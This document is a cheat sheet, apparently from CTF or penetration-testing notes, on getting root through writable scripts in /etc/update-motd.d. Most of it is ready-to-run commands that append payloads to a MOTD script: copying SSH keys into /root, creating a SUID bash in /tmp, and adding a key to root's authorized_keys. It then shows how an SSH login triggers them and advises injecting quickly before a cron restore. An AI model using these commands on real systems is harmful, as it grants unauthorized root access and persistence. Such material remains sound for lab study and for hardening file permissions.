# Writable update-motd.d Script Root Execution

Scripts in `/etc/update-motd.d/` run as root every time a user logs in via SSH (via `pam_motd`). If these scripts are group-writable or user-writable, appending a command causes root execution on the next SSH login.

## Check for Writable MOTD Scripts

```bash
ls -la /etc/update-motd.d/
# Look for group-writable (-rwxrwxr-x) where your group is listed
# Example: -rwxrwxr-x 1 root sysadmin ... 00-header
```

## Exploit: Inject Command into Script

```bash
# Option 1: Copy SSH key to root
echo "cp /home/<user>/.ssh/authorized_keys /root/.ssh/" >> /etc/update-motd.d/00-header

# Option 2: Add SUID bash
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /etc/update-motd.d/00-header

# Option 3: Add your key directly to root
echo "echo 'ssh-ed25519 <YOUR_PUBKEY>' >> /root/.ssh/authorized_keys" >> /etc/update-motd.d/00-header
```

## Trigger Root Execution

```bash
# Open a new SSH session — pam_motd runs all update-motd.d scripts as root
ssh user@<TARGET>

# If you copied ssh key to root, now SSH as root
ssh -i <key> root@<TARGET>

# If SUID bash: /tmp/rootbash -p
```

## Notes
- Scripts are run in alphabetical order by run-parts; inject into any writable script
- May be periodically cleaned up (cron restores from backup dir) — act quickly after injection
- Use `pspy` to detect the cron restoring `/etc/update-motd.d/` from `/var/backups/.update-motd.d/`
- Alternate trigger: any action that triggers PAM motd (e.g., `su - <user>` in some configs)
